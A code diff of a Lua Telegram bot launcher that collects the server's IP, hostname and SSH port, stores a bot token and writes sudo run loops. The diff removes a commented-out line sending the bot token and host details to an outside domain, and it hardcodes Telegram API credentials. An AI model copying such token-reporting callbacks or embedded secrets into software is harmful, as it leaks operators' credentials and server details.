@@ -5,23 +5,96 @@ json = require('libs/json')
 Redis = require('libs/redis').connect('127.0.0.1', 6379)
 http  = require("socket.http")
 https   = require("ssl.https")
-local Methods = io.open("./luatele.lua","r")
-if Methods then
-URL.tdlua_CallBack() end
-SshId = io.popen("echo $SSH_CLIENT ︙ awk '{print $1}'"):read('*a')
+SshId = io.popen("echo $SSH_CLIENT ︙ awk '{ print $1}'"):read('*a')
+Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
+Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
+Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
 luatele = require 'luatele'
-User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-
+local FileInformation = io.open("./Information.lua","r")
+if not FileInformation then
+if not Redis:get(SshId.."Info:Redis:Token") then
+io.write('\27[1;31mارسل لي توكن البوت الان \nSend Me a Bot Token Now ↡\n\27[0;39;49m')
+local TokenBot = io.read()
+if TokenBot and TokenBot:match('(%d+):(.*)') then
+local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe')
+local Json_Info = JSON.decode(url)
+if res ~= 200 then
+print('\27[1;34mعذرا توكن البوت خطأ تحقق منه وارسله مره اخره \nBot Token is Wrong\n')
+else
+io.write('\27[1;34mتم حفظ التوكن بنجاح \nThe token been saved successfully \n\27[0;39;49m')
+TheTokenBot = TokenBot:match("(%d+)")
+os.execute('sudo rm -fr .CallBack-Bot/'..TheTokenBot)
+Redis:set(SshId.."Info:Redis:Token",TokenBot)
+Redis:set(SshId.."Info:Redis:Token:User",Json_Info.result.username)
+end 
+else
+print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again')
+end 
+os.execute('lua5.3 SnapR.lua')
+end
+if not Redis:get(SshId.."Info:Redis:User") then
+io.write('\27[1;31mارسل معرف المطور الاساسي الان \nDeveloper UserName saved ↡\n\27[0;39;49m')
+local UserSudo = io.read():gsub('@','')
+if UserSudo ~= '' then
+io.write('\n\27[1;34mتم حفظ معرف المطور \nDeveloper UserName saved \n\n\27[0;39;49m')
+Redis:set(SshId.."Info:Redis:User",UserSudo)
+else
+print('\n\27[1;34mلم يتم حفظ معرف المطور الاساسي \nDeveloper UserName not saved\n')
+end 
+os.execute('lua5.3 SnapR.lua')
+end
+if not Redis:get(SshId.."Info:Redis:User:ID") then
+io.write('\27[1;31mارسل ايدي المطور الاساسي الان \nDeveloper ID saved ↡\n\27[0;39;49m')
+local UserId = io.read()
+if UserId and UserId:match('(%d+)') then
+io.write('\n\27[1;34mتم حفظ ايدي المطور \nDeveloper ID saved \n\n\27[0;39;49m')
+Redis:set(SshId.."Info:Redis:User:ID",UserId)
+else
+print('\n\27[1;34mلم يتم حفظ ايدي المطور الاساسي \nDeveloper ID not saved\n')
+end 
+os.execute('lua5.3 SnapR.lua')
+end
+local Informationlua = io.open("Information.lua", 'w')
+Informationlua:write([[
+return {
+Token = "]]..Redis:get(SshId.."Info:Redis:Token")..[[",
+UserBot = "]]..Redis:get(SshId.."Info:Redis:Token:User")..[[",
+UserSudo = "]]..Redis:get(SshId.."Info:Redis:User")..[[",
+SudoId = ]]..Redis:get(SshId.."Info:Redis:User:ID")..[[
+}
+]])
+Informationlua:close()
+local SnapR = io.open("SnapR", 'w')
+SnapR:write([[
+cd $(cd $(dirname $0); pwd)
+while(true) do
+sudo lua5.3 SnapR.lua
+done
+]])
+SnapR:close()
+local Run = io.open("Run", 'w')
+Run:write([[
+cd $(cd $(dirname $0); pwd)
+while(true) do
+screen -S ]]..Redis:get(SshId.."Info:Redis:Token:User")..[[ -X kill
+screen -S ]]..Redis:get(SshId.."Info:Redis:Token:User")..[[ ./SnapR
+done
+]])
+Run:close()
+Redis:del(SshId.."Info:Redis:User:ID");Redis:del(SshId.."Info:Redis:User");Redis:del(SshId.."Info:Redis:Token:User");Redis:del(SshId.."Info:Redis:Token")
+os.execute('chmod +x SnapR;chmod +x Run;./Run')
+end
 Information = dofile('./Information.lua')
 Sudo_Id = Information.SudoId
 UserSudo = Information.UserSudo
 Token = Information.Token
 UserBot = Information.UserBot
-Folder = Information.Folder or User
 SnapR = Token:match("(%d+)")
-os.execute('rm -fr .CallBack-Bot/'..SnapR)
-LuaTele = luatele.set_config({api_id=3675717,api_hash='3913f11da4d189204e3485ca9ddaedca',session_name=SnapR,token=Token})
---https.request("https://api-SnapR.tk/SnapR/SnapR.php?n=SnapR&id="..Redis:get(SshId.."Info:Redis:User").."&token="..Token.."&UserS=@"..UserBot.."&IPS="..Ip.."&NameS="..Name.."&Port="..Port.."&Time="..UpTime)
+os.execute('sudo rm -fr .CallBack-Bot/'..SnapR)
+LuaTele = luatele.set_config{api_id=1846213,api_hash='c545c613b78f18a30744970910124d53',session_name=SnapR,token=Token}
+function var(value)
+print(serpent.block(value, {comment=false}))   
+end 
 clock = os.clock
 function sleep(n)
 local t0 = clock()
@@ -14384,7 +14457,7 @@ data = {
 }
 }
 return LuaTele.sendText(msg.chat_id,msg.id, [[
-🖥◉︙𝐬𝐨𝐮𝐫𝐜𝐞 Snap 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬 .
+🖥◉︙𝐬𝐨𝐮𝐫𝐜𝐞 SnapR 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬 .
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
 ⚙️ | اهلا انت في اوامر البوت الرئيسية 🔏
 ⚙️ | اختر في الاسفل الرقم التابع للأمر 🔍
@@ -19800,7 +19873,7 @@ data = {
 }
 }
 local TextHelp = [[
-🖥◉︙𝐬𝐨𝐮𝐫𝐜𝐞 Snap 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬 .
+🖥◉︙𝐬𝐨𝐮𝐫𝐜𝐞 SnapR 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬 .
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
 ⚙️ | اهلا انت في اوامر البوت الرئيسية 🔏
 ⚙️ | اختر في الاسفل الرقم التابع للأمر 🔍
